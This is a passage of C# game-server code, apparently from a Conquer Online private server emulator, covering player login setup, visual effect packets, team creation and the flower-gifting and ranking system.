            if (client.Entity.MapID == 8516) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8517) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8518) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8519) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8520) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8521) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8522) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8523) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8524) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8525) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 8526) client.Entity.Teleport(1002, 303, 278);

            #endregion

            if (!client.TransferedPlayer)
                Database.EntityTable.LoginNow(client);
            #region AtSteedRace
            if (client.Entity.MapID == 1950) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 1507) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2064) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2063) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2062) client.Entity.Teleport(1002, 303, 278);
            if (client.Entity.MapID == 2061) client.Entity.Teleport(1002, 303, 278);
            #endregion

            client.Filtering = true;
            if (client.WentToComplete)
                return;
            for (ushort i = 1415; i <= 1423; i++)
                if (!client.Spells.ContainsKey(i))
                    client.AddSpell(new Spell(true) { ID = i });

            if (!client.TransferedPlayer)
                RemoveBadSkills(client);
            DateTime now = DateTime.Now;

            GamePackets.AutoHunt AutoHunting = new GamePackets.AutoHunt(true) { Show = 341 }; AutoHunting.Send(client);


            if (client.WarehousePW != 0)
            {
                WareHousePassword whp = new WareHousePassword(true);
                whp.type = WareHousePassword.PasswordCorrect;
                whp.OldPassword = 0x1;
                client.Send(whp);
            }
            if (client.Entity.Class >= 40 && client.Entity.Class <= 45)
            {
                client.RemoveSpell(new Spell(true) { ID = 1025 });//SuperMan
            }
            if (client.Entity.Class >= 60 && client.Entity.Class <= 65)
            {
                client.RemoveSpell(new Spell(true) { ID = 1025 });//Superman
            }
            if (client.Entity.Class >= 132 && client.Entity.Class <= 135)
            {
                client.RemoveSpell(new Spell(true) { ID = 10425 });//tranq
            }
            if (client.Entity.Class >= 50 && client.Entity.Class <= 55)
            {
                client.RemoveSpell(new Spell(true) { ID = 1025 });//Superman
            }
            if (client.Entity.Class >= 10 && client.Entity.Class <= 15)
            {
                client.RemoveSpell(new Spell(true) { ID = 1025 });//Superman
            }
            if ((client.Entity.Class >= 70 && client.Entity.Class <= 75) || (client.Entity.Class >= 60 && client.Entity.Class <= 65 || (client.Entity.Class >= 10 && client.Entity.Class <= 15 || (client.Entity.Class >= 50 && client.Entity.Class <= 55 || (client.Entity.Class >= 20 && client.Entity.Class <= 25 || (client.Entity.Class >= 142 && client.Entity.Class <= 145 || (client.Entity.Class >= 132 && client.Entity.Class <= 135)))))))
            {
                client.RemoveSpell(new Spell(true) { ID = 8001 });//Scatter
            }
            if (client.Entity.Class >= 10 && client.Entity.Class <= 45)
            {
                client.RemoveSpell(new Spell(true) { ID = 12090 });//FrankoClone
            }
            if (client.Entity.Class >= 65 && client.Entity.Class <= 145)
            {
                client.RemoveSpell(new Spell(true) { ID = 12090 });//FrankoClone
            }
            if (client.Entity.Class >= 142 && client.Entity.Class <= 145)
            {
                client.RemoveSpell(new Spell(true) { ID = 11180 });//MortalDrag
            }
            if (client.Entity.Class >= 142 && client.Entity.Class <= 145)
            {
                client.RemoveSpell(new Spell(true) { ID = 11190 });//MortalDrag
            }
            if (client.Entity.Class >= 142 && client.Entity.Class <= 145)
            {
                client.RemoveSpell(new Spell(true) { ID = 11200 });//MortalDrag
            }
            if (client.Entity.Class >= 42 && client.Entity.Class <= 45)
            {
                client.RemoveSpell(new Spell(true) { ID = 10425 });//Tranquality
            }

            client.WentToComplete = true;
            client.Entity.SendUpdates = true;

            foreach (var Guild in Kernel.Guilds.Values)
            {
                Guild.SendName(client);
            }

            ServerTime time = new ServerTime();
            time.Year = (uint)DateTime.Now.Year;
            time.Month = (uint)DateTime.Now.Month;
            time.DayOfYear = (uint)DateTime.Now.DayOfYear;
            time.DayOfMonth = (uint)DateTime.Now.Day;
            time.Hour = (uint)DateTime.Now.Hour;
            time.Minute = (uint)DateTime.Now.Minute;
            time.Second = (uint)DateTime.Now.Second;
            client.Send(time);

            #region ElitePk
            bool going = false;
            foreach (var epk in ElitePKTournament.Tournaments)
                if (epk.State != ElitePK.States.GUI_Top8Ranking)
                    going = true;
            if (going)
            {
                ElitePKBrackets brackets = new ElitePKBrackets(true, 0);
                brackets.Type = ElitePKBrackets.EPK_State;
                brackets.OnGoing = true;
                client.Send(brackets);
            }
            if (ElitePKTournament.TimersRegistered)
            {
                ElitePKBrackets brackets = new ElitePKBrackets(true, 0);
                brackets.Type = ElitePKBrackets.EPK_State;
                brackets.OnGoing = true;
                client.Send(brackets);
            }
            #endregion



            client.Entity.DoubleExperienceTime = (ushort)(client.Entity.DoubleExperienceTime + (1 - 1));
            client.SuperPotion = (ushort)(client.SuperPotion + (1 - 1));
            client.Entity.HeavenBlessing = (ushort)(client.Entity.HeavenBlessing + (1 - 1));
            client.OnlineTrainingPoints = (ushort)(client.OnlineTrainingPoints + (1 - 1));

            if (Kernel.QuizShow.Open)
                Kernel.QuizShow.AddPlayer(client);
            client.Entity.Update(Network.GamePackets.Update.QuizPoints, client.Entity.QuizPoints, true);
            if (client.Mentor != null)
            {
                if (client.Mentor.IsOnline)
                {
                    MentorInformation Information = new MentorInformation(true);
                    Information.Mentor_Type = 1;
                    Information.Mentor_ID = client.Mentor.Client.Entity.UID;
                    Information.Apprentice_ID = client.Entity.UID;
                    Information.Enrole_Date = client.Mentor.EnroleDate;
                    Information.Mentor_Level = client.Mentor.Client.Entity.Level;
                    Information.Mentor_Class = client.Mentor.Client.Entity.Class;
                    Information.Mentor_PkPoints = client.Mentor.Client.Entity.PKPoints;
                    Information.Mentor_Mesh = client.Mentor.Client.Entity.Mesh;
                    Information.Mentor_Online = true;
                    Information.Shared_Battle_Power = client.Entity.BattlePowerFrom(client.Mentor.Client.Entity);
                    Information.String_Count = 3;
                    Information.Mentor_Name = client.Mentor.Client.Entity.Name;
                    Information.Apprentice_Name = client.Entity.Name;
                    Information.Mentor_Spouse_Name = client.Mentor.Client.Entity.Spouse;
                    client.ReviewMentor();
                    client.Send(Information);

                    ApprenticeInformation AppInfo = new ApprenticeInformation();
                    AppInfo.Apprentice_ID = client.Entity.UID;
                    AppInfo.Apprentice_Level = client.Entity.Level;
                    AppInfo.Apprentice_Class = client.Entity.Class;
                    AppInfo.Apprentice_PkPoints = client.Entity.PKPoints;
                    AppInfo.Apprentice_Experience = client.AsApprentice.Actual_Experience;
                    AppInfo.Apprentice_Composing = client.AsApprentice.Actual_Plus;
                    AppInfo.Apprentice_Blessing = client.AsApprentice.Actual_HeavenBlessing;
                    AppInfo.Apprentice_Name = client.Entity.Name;
                    AppInfo.Apprentice_Online = true;
                    AppInfo.Apprentice_Spouse_Name = client.Entity.Spouse;
                    AppInfo.Enrole_date = client.Mentor.EnroleDate;
                    AppInfo.Mentor_ID = client.Mentor.ID;
                    AppInfo.Mentor_Mesh = client.Mentor.Client.Entity.Mesh;
                    AppInfo.Mentor_Name = client.Mentor.Name;
                    AppInfo.Type = 2;
                    client.Mentor.Client.Send(AppInfo);
                }
                else
                {
                    MentorInformation Information = new MentorInformation(true);
                    Information.Mentor_Type = 1;
                    Information.Mentor_ID = client.Mentor.ID;
                    Information.Apprentice_ID = client.Entity.UID;
                    Information.Enrole_Date = client.Mentor.EnroleDate;
                    Information.Mentor_Online = false;
                    Information.String_Count = 2;
                    Information.Mentor_Name = client.Mentor.Name;
                    Information.Apprentice_Name = client.Entity.Name;

                    client.Send(Information);
                }
            }
            NobilityInfo update = new NobilityInfo(true);
            update.Type = NobilityInfo.Icon;
            update.dwParam = client.NobilityInformation.EntityUID;
            update.UpdateString(client.NobilityInformation);
            client.Send(update);

            foreach (ConquerItem item in client.Inventory.Objects)
                item.Send(client);

            foreach (ConquerItem item in client.Equipment.Objects)
            {
                if (item != null)
                {
                    if (Database.ConquerItemInformation.BaseInformations.ContainsKey(item.ID))
                    {
                        item.Send(client);
                    }
                    else
                    {
                        client.Equipment.DestroyFranko(item.Position);
                    }
                }
            }
            client.Entity.Update(0x80, 0x27b1, false);
            client.Entity.Update(Update.Merchant, 255, false);
            client.LoadItemStats();
            #region New Titles
            if (client.Entity.VIPLevel >= 6)
            {
                if (!client.Entity.Titles.ContainsKey(Network.GamePackets.TitlePacket.Titles.Vip))
                    client.Entity.AddTopStatus((ulong)Network.GamePackets.TitlePacket.Titles.Vip, 0, DateTime.Now.AddMonths(1), false);
                client.Entity.MyTitle = TitlePacket.Titles.Vip;
            }
            if (client.Entity.Titles.Count > 0)
            {
                TitlePacket tpacket = new TitlePacket(true);
                tpacket.Identifier = client.Entity.UID;
                tpacket.Title = client.Entity.MyTitle;
                tpacket.Type = TitlePacket.Types.Switch;
                tpacket.Count = 1;
                tpacket.Add((byte)client.Entity.MyTitle);
                client.Entity.MyTitle = tpacket.Title;
                client.Send(tpacket);
                //client.Entity.Teleport(client.Entity.MapID, client.Entity.X, client.Entity.Y);
            }
            #endregion
            #region New Titles
            if (client.Entity.Titles.Count > 0)
            {
                TitlePacket tpacket = new TitlePacket(true);
                tpacket.Identifier = client.Entity.UID;
                tpacket.Title = client.Entity.MyTitle;
                tpacket.Type = TitlePacket.Types.Switch;
                tpacket.Count = 1;
                tpacket.Add((byte)client.Entity.MyTitle);
                client.Entity.MyTitle = tpacket.Title;
                client.Send(tpacket);
            }
            #endregion
            #region Storages
            new CoatStorage().Login(client);
            new TitleStorage().Login(client);
            #endregion
            //     Database.NobilityTable.Load();
            if (!client.Equipment.Free(5))
            {
                if (IsFranko(client.Equipment.TryGetItem(5).ID))
                {
                    if (client.Equipment.Free(4))
                        client.Equipment.DestroyFranko(5);
                    else
                    {
                        if (client.Equipment.TryGetItem(4).ID / 1000 != 500)
                            client.Equipment.DestroyFranko(5);
                    }
                }
            }
            client.GemAlgorithm();
            client.CalculateStatBonus();
            client.CalculateHPBonus();
            client.Entity.Stamina = 100;


            DateTime lastLogin = client["lastlogin"];
            string prevLoc = client["lastlocation"];

            client.Send(new LastLogin()
            {
                TotalSeconds = (uint)(lastLogin - new DateTime(1970, 1, 1).ToLocalTime()).TotalSeconds,
                DifferentCity = prevLoc == client.Account.IP,
                DifferentPlace = prevLoc != client.Account.IP
            });
            client["lastlogin"] = DateTime.Now;
            client["lastlocation"] = prevLoc;

            #region Loading Bar at Login
            Send_Effect(client, 220, 164, 1, 5, "MTA!");
            client.SendScreen(client.Entity.SpawnPacket, false);
            #endregion




            client.Entity.VIPLevel = client.Entity.VIPLevel;
            if (client.Entity.VIPLevel > 0)
            {
                Network.GamePackets.VipStatus vip = new Network.GamePackets.VipStatus();
                client.Send(vip.ToArray());
            }
            client.Send(new MapStatus() { BaseID = client.Map.BaseID, ID = client.Map.ID, Status = Database.MapsTable.MapInformations[client.Map.ID].Status, Weather = Database.MapsTable.MapInformations[client.Map.ID].Weather });

            if (client.Entity.Hitpoints == 0)
                client.Entity.Hitpoints = 1;
            client.Entity.HandleTiming = true;
            if (client.Entity.MentorBattlePower != 0)
                client.Entity.Update(Network.GamePackets.Update.MentorBattlePower, client.Entity.MentorBattlePower, false);
            if (client.Guild != null)
            {
                client.Guild.SendAllyAndEnemy(client);
                client.Entity.GuildBattlePower = client.Guild.GetSharedBattlepower(client.AsMember.Rank);
            }
            if (Game.ConquerStructures.Broadcast.CurrentBroadcast.EntityID > 2)
                client.Send(new Network.GamePackets.Message(Game.ConquerStructures.Broadcast.CurrentBroadcast.Message, "ALLUSERS", Game.ConquerStructures.Broadcast.CurrentBroadcast.EntityName, System.Drawing.Color.Red, Network.GamePackets.Message.BroadcastMessage));
            client.Entity.Update(Update.RaceShopPoints, client.RacePoints, false);
            client.Entity.Update(Network.GamePackets.Update.LuckyTimeTimer, client.BlessTime, false);
            if (client.Entity.HeavenBlessing != 0)
            {
                client.Entity.AddFlag(Network.GamePackets.Update.Flags.HeavenBlessing);
                client.Entity.Update(Network.GamePackets.Update.HeavensBlessing, client.Entity.HeavenBlessing, false);
                client.Entity.Update(Network.GamePackets._String.Effect, "bless", true);
                client.Entity.Update(Network.GamePackets.Update.OnlineTraining, client.OnlineTrainingPoints, false);
            }
            if (client.ClaimableItem.Count > 0)
                foreach (var item in client.ClaimableItem.Values)
                    item.Send(client);
            if (client.DeatinedItem.Count > 0)
                foreach (var item in client.DeatinedItem.Values)
                    item.Send(client);
            client.Equipment.UpdateEntityPacket();

            client.Send(new ChiPowers(true).Query(client));
            SendChiRankings(new GenericRanking(true) { Mode = GenericRanking.QueryCount }, client);
            DateTime Now64 = DateTime.Now;


            #region TeamArena
            if ((Now64.Hour >= 11 && Now64.Hour < 13) || (Now64.Hour >= 19 && Now64.Hour < 21))
            {
                client.MessageBox("Team arena has started! It will open for two hours! Would you like to sign up?",
                    ////// hot yad code ya3ml create team 
                    (p) => { Game.TeamArena.QualifyEngine.DoSignup(p); },
                    (p) => { p.Send("You can still join from the team arena interface!"); });
            }
            #endregion

            Database.PkExpelTable.Load(client);

            ChangeAppearance(client, (AppearanceType)client.Appearance);

            client.Challenge = null;
            if (client.Prizes.Count > 0)
                MaTrix.Inbox.SendInbox(client, true);
            client.GetArsenalDonation();
            // client.Entity.Effect = client.Entity.Effect;
            if (client.Entity.MyAchievement != null)
                client.Entity.MyAchievement.Send();
            client.Entity.UpdateEffects(true);
            client.SashSlots = client.SashSlots;
        }

        public static void Send_Effect(Client.GameState Client, uint data_8, ushort Type, ushort direction, uint LoopTime, string EffectName, byte progress = 2)
        {
            byte[] Packet = new byte[47 + 4 + EffectName.Length];
            Writer.WriteUInt16((ushort)(Packet.Length - 8), 0, Packet);
            Writer.WriteUInt16(10010, 2, Packet);
            Writer.WriteUInt32(Client.Entity.UID, 4 + 4, Packet);
            Writer.WriteUInt32(data_8, 8 + 4, Packet);
            Writer.WriteUInt16(Type, 20 + 4, Packet);
            Writer.WriteUInt16(direction, 22 + 4, Packet);
            Writer.WriteUInt32(LoopTime, 32 + 4, Packet);
            Writer.WriteByte(progress, 37 + 4, Packet);
            Writer.WriteByte((byte)(EffectName.Length), 38 + 4, Packet);
            Writer.WriteString(EffectName, 39 + 4, Packet);
            Client.Send(Packet);
        }
        #endregion
        #region CreateTeam
        public static void CreateTeam(Team team, Client.GameState client)
        {
            if (client.Entity.MaxHitpoints == 0)//if(hp == 0) the client will close
                return;
            if (client.Entity.MapID == 8892 || client.InQualifier())
            {
                NpcReply reply = new NpcReply(6, "Sorry, All team Systems is forbidden here");
                reply.OptionID = 255;
                client.Send(reply.ToArray());
                return;
            }
            client.Team = new Game.ConquerStructures.Team(client);

            team.Type = 15;
            client.Send(team.ToArray());

            team.Type = 0;
            client.Send(team.ToArray());
            return;
        }
        #endregion
        #region Flowers
        public static void SendFlower(Client.GameState client, byte[] packet)
        {

            byte typ1 = packet[4];
            uint Target = BitConverter.ToUInt32(packet, 8);
            uint ITEM_UID = BitConverter.ToUInt32(packet, 12);

            if (IsBoy(client.Entity.Body) && typ1 == 0)//boy send
            {
                switch (ITEM_UID)
                {
                    case 0://send my flower
                        {
                            if (client.Entity.MyFlowers.aFlower == 0) break;

                            Client.GameState target_client;
                            if (Kernel.GamePool.TryGetValue(Target, out target_client))
                            {
                                if (!IsGirl(target_client.Entity.Body))
                                    return;
                                client.Entity.MyFlowers.aFlower = 0;
                                client.Entity.MyFlowers.SendDay = (uint)DateTime.Now.Day;

                                target_client.Entity.MyFlowers.RedRoses2day += 1;
                                target_client.Entity.MyFlowers.RedRoses += 1;
                                GamePackets.SendFlower flow = new GamePackets.SendFlower();
                                flow.Typing = 0;
                                flow.Effect = (byte)Game.Features.Flowers.Effect.Tulips;
                                flow.Amount = 1;
                                flow.SenderName = client.Entity.Name;
                                flow.ReceiverName = target_client.Entity.Name;
                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Rouse;
                                if (target_client.AsMember != null)
                                    target_client.AsMember.Rouses += 1;

                                client.SendScreen(flow.ToArray(), true);
                            }
                            break;
                        }
                    default:
                        {

                            Network.GamePackets.ConquerItem Item = null;

                            if (client.Inventory.TryGetItem(ITEM_UID, out Item))
                            {

                                Client.GameState target_client;
                                if (Kernel.GamePool.TryGetValue(Target, out target_client))
                                {

                                    if (!IsGirl(target_client.Entity.Body))
                                        return;
                                    // if (Item.ID % 1000 != Database.ClientDB.Items[Item.ID].Durability)
                                    //     break;


                                    uint Amount = Item.ID % 1000;

                                    GamePackets.SendFlower flow = new GamePackets.SendFlower();
                                    flow.Typing = typ1;
                                    flow.Amount = Amount;
                                    flow.SenderName = client.Entity.Name;
                                    flow.ReceiverName = target_client.Entity.Name;

                                    switch (GetFlowerTyp(Item.ID))
                                    {
                                        case (byte)Game.Features.Flowers.FlowersT.Rouse:
                                            {
                                                flow.Effect = (byte)Game.Features.Flowers.Effect.Rouse;
                                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Rouse;

                                                target_client.Entity.MyFlowers.RedRoses2day += Amount;
                                                target_client.Entity.MyFlowers.RedRoses += Amount;
                                                if (Game.Features.Flowers.Flowers.RedRousesTop100.Length > 98)
                                                {
                                                    if (Game.Features.Flowers.Flowers.RedRousesTop100[98].RedRoses <= target_client.Entity.MyFlowers.RedRoses)
                                                    {
                                                        Game.Features.Flowers.Flowers.CulculateRankRouse(target_client.Entity.MyFlowers);
                                                    }
                                                }
                                                else
                                                    Game.Features.Flowers.Flowers.CulculateRankRouse(target_client.Entity.MyFlowers);

                                                if (target_client.AsMember != null)
                                                    target_client.AsMember.Rouses += Amount;
                                                break;
                                            }
                                        case (byte)Game.Features.Flowers.FlowersT.Lilies:
                                            {
                                                flow.Effect = (byte)Game.Features.Flowers.Effect.Lilies;
                                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Lilies;

                                                target_client.Entity.MyFlowers.Lilies2day += Amount;
                                                target_client.Entity.MyFlowers.Lilies += Amount;
                                                if (Game.Features.Flowers.Flowers.LiliesTop100.Length > 98)
                                                {
                                                    if (Game.Features.Flowers.Flowers.LiliesTop100[98].Lilies <= target_client.Entity.MyFlowers.Lilies)
                                                    {
                                                        Game.Features.Flowers.Flowers.CulculateRankLilies(target_client.Entity.MyFlowers);
                                                    }
                                                }
                                                else
                                                    Game.Features.Flowers.Flowers.CulculateRankLilies(target_client.Entity.MyFlowers);

                                                if (target_client.AsMember != null)
                                                    target_client.AsMember.Lilies += Amount;
                                                break;
                                            }
                                        case (byte)Game.Features.Flowers.FlowersT.Orchids:
                                            {
                                                flow.Effect = (byte)Game.Features.Flowers.Effect.Orchids;
                                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Orchids;

                                                target_client.Entity.MyFlowers.Orchads2day += Amount;
                                                target_client.Entity.MyFlowers.Orchads += Amount;
                                                if (Game.Features.Flowers.Flowers.OrchidsTop100.Length > 98)
                                                {
                                                    if (Game.Features.Flowers.Flowers.OrchidsTop100[98].Orchads <= target_client.Entity.MyFlowers.Orchads)
                                                    {
                                                        Game.Features.Flowers.Flowers.CulculateRankOrchids(target_client.Entity.MyFlowers);
                                                    }
                                                }
                                                else
                                                    Game.Features.Flowers.Flowers.CulculateRankOrchids(target_client.Entity.MyFlowers);

                                                if (target_client.AsMember != null)
                                                    target_client.AsMember.Orchids += Amount;
                                                break;
                                            }
                                        case (byte)Game.Features.Flowers.FlowersT.Tulips:
                                            {
                                                flow.Effect = (byte)Game.Features.Flowers.Effect.Tulips;
                                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Tulips;

                                                target_client.Entity.MyFlowers.Tulips2day += Amount;
                                                target_client.Entity.MyFlowers.Tulips += Amount;
                                                if (Game.Features.Flowers.Flowers.TulipsTop100.Length > 98)
                                                {
                                                    if (Game.Features.Flowers.Flowers.TulipsTop100[98].Tulips <= target_client.Entity.MyFlowers.Tulips)
                                                    {
                                                        Game.Features.Flowers.Flowers.CulculateRankTulips(target_client.Entity.MyFlowers);
                                                    }
                                                }
                                                else
                                                    Game.Features.Flowers.Flowers.CulculateRankTulips(target_client.Entity.MyFlowers);

                                                if (target_client.AsMember != null)
                                                    target_client.AsMember.Tulips += Amount;
                                                break;
                                            }
                                    }

                                    client.Inventory.Remove(Item, Enums.ItemUse.Remove);


                                    client.SendScreen(flow.ToArray(), true);
                                }
                            }

                            break;
                        }
                }
            }
            else if (IsGirl(client.Entity.Body) && typ1 == 1)//girl send 
            {
                switch (ITEM_UID)
                {
                    case 0://curent flower
                        {
                            if (client.Entity.MyFlowers.aFlower == 0)
                                return;
                            Client.GameState target_client;
                            if (Kernel.GamePool.TryGetValue(Target, out target_client))
                            {
                                if (!IsBoy(target_client.Entity.Body))
                                    return;
                                client.Entity.MyFlowers.aFlower = 0;
                                client.Entity.MyFlowers.SendDay = (uint)DateTime.Now.Day;

                                target_client.Entity.MyFlowers.RedRoses += 1;
                                target_client.Entity.MyFlowers.RedRoses2day += 1;
                                GamePackets.SendFlower flow = new GamePackets.SendFlower();
                                flow.Typing = 1;
                                flow.Effect = (byte)Game.Features.Flowers.Effect.Kiss;
                                flow.Amount = 1;
                                flow.SenderName = client.Entity.Name;
                                flow.ReceiverName = target_client.Entity.Name;
                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Kiss;

                                if (target_client.AsMember != null)
                                    target_client.AsMember.Rouses += 1;

                                client.SendScreen(flow.ToArray(), true);
                            }
                            break;
                        }
                    default:
                        {
                            GamePackets.ConquerItem Item = null;

                            if (client.Inventory.TryGetItem(ITEM_UID, out Item))
                            {
                                Client.GameState target_client = null;
                                if (Kernel.GamePool.TryGetValue(Target, out target_client))
                                {
                                    if (!IsBoy(target_client.Entity.Body))
                                        return;
                                    //  if (Item.ID % 1000 != Database.ClientDB.Items[Item.ID].Durability)
                                    //      break;
                                    // Role.Player target_client = obj as Role.Player;

                                    uint Amount = Item.ID % 1000;

                                    GamePackets.SendFlower flow = new GamePackets.SendFlower();
                                    flow.Typing = 1;
                                    flow.Amount = Amount;
                                    flow.SenderName = client.Entity.Name;
                                    flow.ReceiverName = target_client.Entity.Name;

                                    switch (GetFlowerTyp(Item.ID))
                                    {
                                        case (byte)Game.Features.Flowers.FlowersT.Rouse:
                                            {
                                                flow.Effect = (byte)Game.Features.Flowers.Effect.Kiss;
                                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Kiss;

                                                target_client.Entity.MyFlowers.RedRoses2day += Amount;
                                                target_client.Entity.MyFlowers.RedRoses += Amount;
                                                if (Game.Features.Flowers.Flowers.KissTop100.Length > 98)
                                                {
                                                    if (Game.Features.Flowers.Flowers.KissTop100[98].RedRoses <= target_client.Entity.MyFlowers.RedRoses)
                                                    {
                                                        Game.Features.Flowers.Flowers.CulculateRankKiss(target_client.Entity.MyFlowers);
                                                    }
                                                }
                                                else
                                                    Game.Features.Flowers.Flowers.CulculateRankKiss(target_client.Entity.MyFlowers);

                                                if (target_client.AsMember != null)
                                                    target_client.AsMember.Rouses += Amount;
                                                break;
                                            }
                                        case (byte)Game.Features.Flowers.FlowersT.Lilies:
                                            {
                                                flow.Effect = (byte)Game.Features.Flowers.Effect.love;
                                                flow.FType = (byte)Game.Features.Flowers.FlowersT.love;

                                                target_client.Entity.MyFlowers.Lilies2day += Amount;
                                                target_client.Entity.MyFlowers.Lilies += Amount;
                                                if (Game.Features.Flowers.Flowers.LoveTop100.Length > 98)
                                                {
                                                    if (Game.Features.Flowers.Flowers.LoveTop100[98].Lilies <= target_client.Entity.MyFlowers.Lilies)
                                                    {
                                                        Game.Features.Flowers.Flowers.CulculateRankLove(target_client.Entity.MyFlowers);
                                                    }
                                                }
                                                else
                                                    Game.Features.Flowers.Flowers.CulculateRankLove(target_client.Entity.MyFlowers);

                                                if (target_client.AsMember != null)
                                                    target_client.AsMember.Lilies += Amount;
                                                break;
                                            }
                                        case (byte)Game.Features.Flowers.FlowersT.Orchids:
                                            {
                                                flow.Effect = (byte)Game.Features.Flowers.Effect.Tins;
                                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Tins;

                                                target_client.Entity.MyFlowers.Orchads2day += Amount;
                                                target_client.Entity.MyFlowers.Orchads += Amount;
                                                if (Game.Features.Flowers.Flowers.TineTop100.Length > 98)
                                                {
                                                    if (Game.Features.Flowers.Flowers.TineTop100[98].Orchads <= target_client.Entity.MyFlowers.Orchads)
                                                    {
                                                        Game.Features.Flowers.Flowers.CulculateRankTine(target_client.Entity.MyFlowers);
                                                    }
                                                }
                                                else
                                                    Game.Features.Flowers.Flowers.CulculateRankTine(target_client.Entity.MyFlowers);

                                                if (target_client.AsMember != null)
                                                    target_client.AsMember.Orchids += Amount;
                                                break;
                                            }
                                        case (byte)Game.Features.Flowers.FlowersT.Tulips:
                                            {
                                                flow.Effect = (byte)Game.Features.Flowers.Effect.Jade;
                                                flow.FType = (byte)Game.Features.Flowers.FlowersT.Jade;

                                                target_client.Entity.MyFlowers.Tulips2day += Amount;
                                                target_client.Entity.MyFlowers.Tulips += Amount;
                                                if (Game.Features.Flowers.Flowers.JadeTop100.Length > 98)
                                                {
                                                    if (Game.Features.Flowers.Flowers.JadeTop100[98].Tulips <= target_client.Entity.MyFlowers.Tulips)
                                                    {
                                                        Game.Features.Flowers.Flowers.CulculateRankJade(target_client.Entity.MyFlowers);
                                                    }
                                                }
                                                else
                                                    Game.Features.Flowers.Flowers.CulculateRankJade(target_client.Entity.MyFlowers);

                                                if (target_client.AsMember != null)
                                                    target_client.AsMember.Tulips += Amount;
                                                break;
                                            }
                                    }

                                    client.Inventory.Remove(Item, Enums.ItemUse.Remove);

                                    client.SendScreen(flow.ToArray(), true);
                                }
                            }

                            break;
                        }
                }
            }
        }


        public static uint GetFlowerTyp(uint ID)
        {
            if (ID >= 751001 && ID <= 751999 || ID >= 755001 && ID <= 755999)
                return (uint)Game.Features.Flowers.FlowersT.Rouse;
            if (ID >= 752001 && ID <= 752999 || ID >= 756001 && ID <= 756999)
                return (uint)Game.Features.Flowers.FlowersT.Lilies;
            if (ID >= 753001 && ID <= 753999 || ID >= 757001 && ID <= 757999)
                return (uint)Game.Features.Flowers.FlowersT.Orchids;
            if (ID >= 754001 && ID <= 754999 || ID >= 758001 && ID <= 758999)
                return (uint)Game.Features.Flowers.FlowersT.Tulips;
            return 0;
        }

        public static bool IsBoy(uint mesh) { return (mesh == 1003 || mesh == 1004); }
        public static bool IsGirl(uint mesh) { return (mesh == 2001 || mesh == 2002); }

        public class ClientRank
        {
            public uint Rank;
            public uint Amount;
        }
        public static uint CreateMyRank(Client.GameState client, out int rank)
        {

            List<ClientRank> FRanks = new List<ClientRank>()
            {
           new ClientRank(){Rank = (uint)client.Entity.MyFlowers.RankLilies, Amount = client.Entity.MyFlowers.Lilies}
           ,   new ClientRank(){Rank = (uint)client.Entity.MyFlowers.RankOrchids, Amount = client.Entity.MyFlowers.Orchads}
           ,   new ClientRank(){Rank = (uint)client.Entity.MyFlowers.RankRoses, Amount = client.Entity.MyFlowers.RedRoses}
           ,   new ClientRank(){Rank = (uint)client.Entity.MyFlowers.RankTuilps, Amount = client.Entity.MyFlowers.Tulips}
            };
            var array = FRanks.Where((f1) => f1.Rank != 0).ToArray();
            Array.Sort(array, (f1, f2) =>
            {
                int n_rank = f1.Rank.CompareTo(f2.Rank);

                if (f2.Rank == f1.Rank)
                    return f2.Amount.CompareTo(f1.Amount);
                return n_rank;
            });
            if (array != null && array.Length > 0)
            {
                ClientRank BestRank = array[0];
                if (BestRank.Rank != 0)
                {
                    rank = (int)BestRank.Rank;
                    if (client.Entity.MyFlowers.RankLilies == BestRank.Rank && client.Entity.MyFlowers.Lilies == BestRank.Amount)
                        return (byte)Game.Features.Flowers.FlowersT.Lilies;
                    if (client.Entity.MyFlowers.RankOrchids == BestRank.Rank && client.Entity.MyFlowers.Orchads == BestRank.Amount)
                        return (byte)Game.Features.Flowers.FlowersT.Orchids;
                    if (client.Entity.MyFlowers.RankRoses == BestRank.Rank && client.Entity.MyFlowers.RedRoses == BestRank.Amount)
                        return (byte)Game.Features.Flowers.FlowersT.Rouse;
                    if (client.Entity.MyFlowers.RankTuilps == BestRank.Rank && client.Entity.MyFlowers.Tulips == BestRank.Amount)
                        return (byte)Game.Features.Flowers.FlowersT.Tulips;
                }
            }
            rank = 0;
            return 0;
        }

        #endregion
        public static bool NulledClient(Client.GameState client)
        {
            if (client == null)
                return true;
            if (client != null && client.Entity == null)
                return true;

            return false;
        }

        internal static bool IsShield(uint p)
        {
            return p / 1000 == 900;
        }

        internal static bool IsBow(uint p)
        {
            return p / 1000 == 500;
        }

    }
}
